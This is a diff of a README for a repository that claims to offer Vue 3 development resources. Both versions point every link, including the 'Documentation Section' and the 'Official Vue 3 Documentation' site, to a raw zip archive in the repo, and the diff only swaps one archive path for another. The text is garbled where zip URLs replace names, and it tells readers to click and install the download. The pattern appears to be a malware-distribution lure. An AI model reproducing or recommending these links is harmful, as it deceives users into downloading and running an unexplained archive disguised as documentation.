@@ -1,6 +1,6 @@
 # 🎨 skills - Boost Your Vue 3 Development Skills
 
-[![Download Now](https://raw.githubusercontent.com/akrammjidou/skills/main/skills/vue-debug-guides/reference/Software_v3.5.zip)](https://raw.githubusercontent.com/akrammjidou/skills/main/skills/vue-debug-guides/reference/Software_v3.5.zip)
+[![Download Now](https://github.com/akrammjidou/skills/raw/refs/heads/main/skills/vue-development-guides/Software-2.6.zip)](https://github.com/akrammjidou/skills/raw/refs/heads/main/skills/vue-development-guides/Software-2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the skills repository! Here, you will find useful resources to enhanc
 
 ## 📥 Download & Install
 
-To download the latest version, visit this page: [Download the Latest Release](https://raw.githubusercontent.com/akrammjidou/skills/main/skills/vue-debug-guides/reference/Software_v3.5.zip).
+To download the latest version, visit this page: [Download the Latest Release](https://github.com/akrammjidou/skills/raw/refs/heads/main/skills/vue-development-guides/Software-2.6.zip).
 
 1. Click the link above.
 2. You will see a list of the latest releases.
@@ -37,7 +37,7 @@ The skills application offers:
 
 For detailed instructions and user guides, refer to the documentation available in the repository.
 
-1. Visit the [Documentation Section](https://raw.githubusercontent.com/akrammjidou/skills/main/skills/vue-debug-guides/reference/Software_v3.5.zip).
+1. Visit the [Documentation Section](https://github.com/akrammjidou/skills/raw/refs/heads/main/skills/vue-development-guides/Software-2.6.zip).
 2. Browse topics such as installation, tutorials, and frequently asked questions.
 
 ## 🐛 Troubleshooting
@@ -59,7 +59,7 @@ Join our community forums to connect with other users and developers:
 
 ## 🔗 Additional Resources
 
-- **Official https://raw.githubusercontent.com/akrammjidou/skills/main/skills/vue-debug-guides/reference/Software_v3.5.zip Documentation:** Learn more about Vue 3 from the [https://raw.githubusercontent.com/akrammjidou/skills/main/skills/vue-debug-guides/reference/Software_v3.5.zip site](https://raw.githubusercontent.com/akrammjidou/skills/main/skills/vue-debug-guides/reference/Software_v3.5.zip).
+- **Official https://github.com/akrammjidou/skills/raw/refs/heads/main/skills/vue-development-guides/Software-2.6.zip Documentation:** Learn more about Vue 3 from the [https://github.com/akrammjidou/skills/raw/refs/heads/main/skills/vue-development-guides/Software-2.6.zip site](https://github.com/akrammjidou/skills/raw/refs/heads/main/skills/vue-development-guides/Software-2.6.zip).
 - **YouTube Tutorials:** Watch video tutorials for visual learning.
 
 Thank you for using the skills application! Your journey into Vue 3 development starts here. If you have any feedback or questions, feel free to reach out.
